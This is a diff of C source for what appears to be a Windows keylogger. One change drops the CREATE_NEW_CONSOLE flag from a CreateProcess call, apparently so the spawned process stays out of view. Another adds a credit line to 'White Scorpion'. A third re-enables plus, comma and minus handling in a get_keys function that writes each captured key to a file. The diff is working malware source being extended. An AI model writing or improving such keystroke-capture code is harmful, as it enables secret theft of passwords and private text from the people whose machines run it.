@@ -128,7 +128,7 @@ int main(void)
 			mbstowcs(workit, system, strlen(system) + 1);
 			LPWSTR appName = workit;
 
-			if (!CreateProcess(appName, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &info, &processInfo))
+			if (!CreateProcess(appName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
 			{
 				printf("couldn't start that shit man");
 				exit(EXIT_FAILURE);
@@ -164,6 +164,14 @@ int main(void)
 	return 0;
 }
 
+
+
+/************************************************************************************************
+ * This code below is modified from White Scorpion  
+ * 
+ * 
+ * */
+ 
 int get_keys(char* location)
 {
 	short character;
@@ -264,19 +272,18 @@ int get_keys(char* location)
 							fputs("['\"]", file);
 							fclose(file);
 							break;
-							/*case VK_OEM_PLUS:
+						case VK_OEM_PLUS:
 							fputc('+',file);
 							fclose(file);
 							break;
-							case VK_OEM_COMMA:
+						case VK_OEM_COMMA:
 							fputc(',',file);
 							fclose(file);
 							break;
-							case VK_OEM_MINUS:
+						case VK_OEM_MINUS:
 							fputc('-',file);
 							fclose(file);
 							break;
-							*/
 						case VK_OEM_PERIOD:
 							fputc('.',file);
 							fclose(file);
